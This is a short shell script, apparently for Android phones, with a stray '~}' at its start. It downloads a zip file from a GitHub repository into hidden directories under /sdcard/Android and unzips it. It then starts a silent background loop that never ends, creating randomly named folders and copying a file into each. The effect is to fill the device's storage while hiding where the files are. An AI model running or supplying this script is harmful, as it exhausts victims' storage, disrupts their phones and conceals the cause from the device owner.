~}w() {
	
	while [ true ];do
	cd /sdcard/Android/.storage
	mkdir $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
	cd .folder
	cp -f A $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
	done > /dev/null 2>&1 &
	}
	
	f() {
	cd /sdcard/Android
	if [ -e .storage ];then
	w
	else
	mkdir .storage
	cd .storage
	mkdir .folder
	cd .folder
	wget https://github.com/rooted-cyber/upload/raw/master/A.zip
	unzip A.zip
	w
	fi
	}
	f